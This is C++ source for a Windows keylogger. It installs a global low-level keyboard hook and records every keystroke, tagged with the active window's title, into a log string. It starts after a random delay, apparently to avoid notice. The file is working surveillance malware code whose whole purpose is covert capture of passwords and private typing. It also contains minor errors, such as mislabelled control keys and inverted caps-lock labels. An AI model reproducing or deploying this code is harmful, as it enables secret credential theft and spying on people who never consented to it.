#include "Keylogger.h"
#include <iostream>
#include <vector>
#include <sstream>
#include <codecvt>
#include <fstream>
#include "timme.h"

using namespace std;

// Global mutex handle to ensure thread-safe operations
HANDLE Keylogger::mutex;

// Boolean flag to indicate if the keylogger is enabled
bool Keylogger::KeyloggerEnabled = true;

// Handle to the keyboard hook
HHOOK Keylogger::g_hook = nullptr;

// String to store logged keystrokes
std::string Keylogger::g_logs;

// Function to get the title of the currently active window
std::string Keylogger::GetWindowsText()
{
    // Get the handle to the foreground window (active window)
    HWND hwnd = GetForegroundWindow();
    if (hwnd != NULL)
    {
        // Buffer to store the window title
        char title[1024];

        // Retrieve the window title text
        GetWindowText(hwnd, title, sizeof(title));

        // If the title is empty, return "Unknown"
        if (std::string(title).empty())
        {
            return std::string("Unknown");
        }
        // Return the title as a string
        return std::string(title);
    }
    return std::string();
}

// Callback function for processing keyboard hook events
LRESULT CALLBACK Keylogger::HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Ensure thread-safe access by locking the mutex
    WaitForSingleObject(Keylogger::mutex, INFINITE);

    // If the keylogger is not enabled, release the mutex and pass the event to the next hook
    if (!Keylogger::KeyloggerEnabled)
    {
        ReleaseMutex(Keylogger::mutex);
        return CallNextHookEx(g_hook, nCode, wParam, lParam);
    }

    // Release the mutex for further processing
    ReleaseMutex(Keylogger::mutex);

    // Process the event if the hook code is valid and a key is pressed
    if (nCode >= 0 && (wParam == WM_KEYDOWN))
    {
        // Get the pointer to the keyboard event structure
        PKBDLLHOOKSTRUCT pkbhs = (PKBDLLHOOKSTRUCT)(lParam);

        // Ignore events injected programmatically
        if ((pkbhs->flags & LLKHF_INJECTED) != 0)
            return CallNextHookEx(Keylogger::g_hook, nCode, wParam, lParam);

        if (pkbhs)
        {
            // Check if Caps Lock or Shift is active
            BOOL caps_lock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            BOOL shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

            // Buffer to store the current key name
            char current_key[5] = { 0 };
            UINT vk_code = pkbhs->vkCode; // Virtual-key code of the key
            DWORD msg = 1; // Placeholder for message
            msg += pkbhs->scanCode << 16; // Add scan code
            msg += pkbhs->flags << 24; // Add event flags

            // Get the name of the key
            GetKeyNameTextA(msg, current_key, 5);

            // Convert the key name to uppercase if Caps Lock or Shift is active, otherwise lowercase
            if (caps_lock || shift_pressed)
                CharUpperA(current_key);
            else
                CharLowerA(current_key);

            // Convert key name to string
            std::string str_key = current_key;

            // Handle numeric keypad keys separately
            if ((str_key.find("num") != std::string::npos))
            {
                str_key.clear();
                if (pkbhs->vkCode >= VK_NUMPAD0 && pkbhs->vkCode <= VK_NUMPAD9)
                {
                    int num_index = pkbhs->vkCode - VK_NUMPAD0; // Calculate the numeric value
                    str_key = std::to_string(num_index);
                }
            }

            // If the key name is empty, pass the event to the next hook
            if (str_key.empty())
                return CallNextHookEx(g_hook, nCode, wParam, lParam);

            // Handle special keys and assign readable names
            switch (vk_code)
            {
            case VK_F1: case VK_F2: case VK_F3: case VK_F4:
            case VK_F5: case VK_F6: case VK_F7: case VK_F8:
            case VK_F9: case VK_F10: case VK_F11: case VK_F12:
                str_key = "[" + str_key + "]"; // Enclose function key names in brackets
                break;
            case VK_SPACE: str_key = "[SPACE]"; break;
            case VK_RETURN: str_key = "[ENTER]"; break;
            case VK_BACK: str_key = "[BACK]"; break;
            case VK_ESCAPE: str_key = "[ESC]"; break;
            case VK_CONTROL: str_key = "[CTRL]"; break;
            case VK_LCONTROL: str_key = "[RCTRL]"; break;
            case VK_SHIFT: str_key = "[SHIFT]"; break;
            case VK_LSHIFT: str_key = "[LSHIFT]"; break;
            case VK_RSHIFT: str_key = "[RSHIFT]"; break;
            case VK_TAB: str_key = "[TAB]"; break;
            case VK_CAPITAL:
                str_key = caps_lock ? "[CAPSLOCK: OFF]" : "[CAPSLOCK: ON]";
                break;
            default: break;
            }

            // Prefix the key with the active window's title
            str_key = GetWindowsText() + " : " + str_key;

            // Add the key to the logs with thread-safe access
            WaitForSingleObject(Keylogger::mutex, INFINITE);
            g_logs += str_key + "\n";
            ReleaseMutex(Keylogger::mutex);

            str_key.clear(); // Clear the key string for reuse
        }
    }
    // Pass the event to the next hook in the chain
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// Function to initialize and start the keylogger
void Keylogger::StartKeylogger()
{
    // Delay the start slightly to avoid timing issues
    Time::randomDelay();

    // Set a low-level keyboard hook with the specified callback function
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, GetModuleHandle(NULL), 0);

    // Check if the hook was successfully set
    if (!g_hook)
    {
        return;
    }
}

